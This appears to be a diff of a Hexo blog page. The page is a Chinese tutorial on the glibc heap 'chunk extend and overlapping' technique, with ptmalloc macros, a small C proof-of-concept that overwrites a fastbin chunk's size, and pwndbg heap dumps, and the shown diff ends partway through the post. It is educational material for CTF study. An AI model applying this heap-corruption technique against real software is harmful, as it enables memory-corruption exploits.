@@ -1,63 +1,224 @@
+
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="" data-default-color-scheme=&#34;auto&#34;>
+
+
 
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  
-  
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content="my blogs">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    chunk extend and overlapping |
+  <title>chunk extend and overlapping - 知世の小屋</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
     
-    知世の小屋</title>
+    
+      
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css">
+    
   
-  <link rel="shortcut icon" href="/favicon.ico">
+
   
-  <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-  
-  <script src="/js/pace.min.js"></script>
-</head></html>
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+</head>
+
 
 <body>
-  <main class="content">
-    <section class="outer">
-  <article id="post-chunk-extend-and-overlapping" class="article article-type-post" itemscope="" itemprop="blogPost" data-scroll-reveal="">
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
 
-  <div class="article-inner">
-    
-    <header class="article-header">
-      
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-<h1 class="article-title" itemprop="name">
-  chunk extend and overlapping
-</h1>
-
-
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2019/07/25/chunk-extend-and-overlapping/" class="article-date">
-  <time datetime="2019-07-25T15:36:50.000Z" itemprop="datePublished">2019-07-25</time>
-</a>
-      
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Startseite
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archiv
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Kategorie
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Etiketten
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                Über mich
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    
+  </div>
+</nav>
 
-    
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="chunk extend and overlapping">
+              
+            </span>
 
-    <div class="article-entry" itemprop="articleBody">
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-07-25 23:36" pubdate="">
+        July 25, 2019 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
       
       
+      35
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-      <blockquote>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">chunk extend and overlapping</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
 <p>本来打算先写off-by-one和unsorted bin atack的…但是鉴于off-by-one和overlapping的联系以及,,,unsorted bin attack..看起来好像真的用处颇少…于是就偷懒先写这个了(逃</p>
 </blockquote>
 <h1 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h1><p>chunk的拓展?? 是叫这么魔性的东西吗….大概是对下一个chunk有什么操作吧QAQ,打扰了…</p>
@@ -80,190 +241,260 @@
 </ul>
 <p><em>一般就用在off-by-one了吧..绝配</em></p>
 <h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>我们知道我们释放的堆块是先不还给操作系统而是由ptmalloc来接管的</p>
-<p>而ptmalloc在获取chunk大小时的代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="line">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></pre></td></tr></table></figure></p>
+<p>而ptmalloc在获取chunk大小时的代码如下:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">chunksize</span>(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))<br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">chunksize_nomask</span>(p) ((p)-&gt;mchunk_size)<br></code></pre></td></tr></table></figure></p>
 <ol>
 <li>全部获取</li>
 <li>忽略源码</li>
 </ol>
-<p>而获取下一块chunk地址代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure></p>
+<p>而获取下一块chunk地址代码如下:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">next_chunk</span>(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))<br></code></pre></td></tr></table></figure></p>
 <p>也就是当前块地址+当前块大小</p>
-<p>上一块chunk地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br><span class="line">当前块-上一块大小</span><br></pre></td></tr></table></figure></p>
-<p>判断是否inuse<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure></p>
+<p>上一块chunk地址:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">prev_size</span>(p) ((p)-&gt;mchunk_prev_size)<br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">prev_chunk</span>(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))<br>当前块<span class="hljs-selector-tag">-</span>上一块大小<br></code></pre></td></tr></table></figure></p>
+<p>判断是否inuse<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-comment">#define inuse(p)</span><br>    <span class="hljs-function"><span class="hljs-params">((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br></code></pre></td></tr></table></figure></p>
 <p>查看prev_inuse域,此域为1即为inuse</p>
 <h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>也就是说,对于如何判断本chunk相邻chunk的地址完全是通过size来确定的,因而给了我们机会,前辈们真的tql…</p>
 <h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><p>这里引用了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/#1inusefastbinextend" target="_blank" rel="noopener">ctf-wiki</a>的代码,并且我做了一点点小修改:</p>
 <h3 id="inuse状态下"><a href="#inuse状态下" class="headerlink" title="inuse状态下"></a>inuse状态下</h3><ol>
-<li>fastbin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    printf(&quot;[*]ptr:%p\n&quot;,ptr);</span><br><span class="line">    *(long long *)((long long)ptr-0x8)=0x41;</span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(0x30);</span><br><span class="line">    printf(&quot;[*]ptr1:%p\n&quot;,ptr1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<li>fastbin<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span><br></span>&#123;<br>    <span class="hljs-keyword">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr:%p\n"</span>,ptr);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*]ptr1:%p\n"</span>,ptr1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 </li>
 </ol>
-<p>我在第一次malloc处下了断点,然后我们来看看现在堆的情况:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x602020 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 135137,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>发现此时的size是0x21…这里还是想吐槽一些pwndbg把size部分改成了十进制..真的苟..这个docker我忘记改代码了…<br>然后程序继续<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 33,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fc1</span><br><span class="line">&#125;</span><br><span class="line">0x602040 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 135105,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到这里已经分配完了,此时的堆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000020fc1</span><br></pre></td></tr></table></figure></p>
-<p>没有问题,下一步进行size的改写,至于为什么是chunk-8呢,因为我们知道chunk给我们的地址其实是mem的地址,也就是0x602010处,因此减8可以到pre_size处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 65,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里已经改写成功了,此时的heap分析出来的是这样的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 65,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x303a7274705d2a5b,</span><br><span class="line">  bk = 0x6666666666663778,</span><br><span class="line">  fd_nextsize = 0xa3836356566,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602450 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134065,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>成功通过size欺骗到了ptmalloc机制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/14gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000041</span><br><span class="line">0x602010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000021</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000411</span><br><span class="line">0x602050:       0x303a7274705d2a5b      0x6666666666663778</span><br><span class="line">0x602060:       0x00000a3836356566      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
-<p>然后我们让程序到下一个分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 65,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1041,</span><br><span class="line">  fd = 0x303a7274705d2a5b,</span><br><span class="line">  bk = 0x6666666666663778,</span><br><span class="line">  fd_nextsize = 0xa3836356566,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602450 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 134065,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此时这里虽然没变,但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x ptr1</span><br><span class="line">$4 = 0x602010</span><br></pre></td></tr></table></figure></p>
+<p>我在第一次malloc处下了断点,然后我们来看看现在堆的情况:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; heap<br><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x20fe1</span><br>&#125;<br><span class="hljs-number">0x602020</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135137</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>发现此时的size是0x21…这里还是想吐槽一些pwndbg把size部分改成了十进制..真的苟..这个docker我忘记改代码了…<br>然后程序继续<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0x602000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x602020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x20fc1</span><br>&#125;<br><span class="hljs-number">0x602040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135105</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  bk = <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  bk_nextsize = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>可以看到这里已经分配完了,此时的堆<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602010</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x602030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000000000020fc1<br></code></pre></td></tr></table></figure></p>
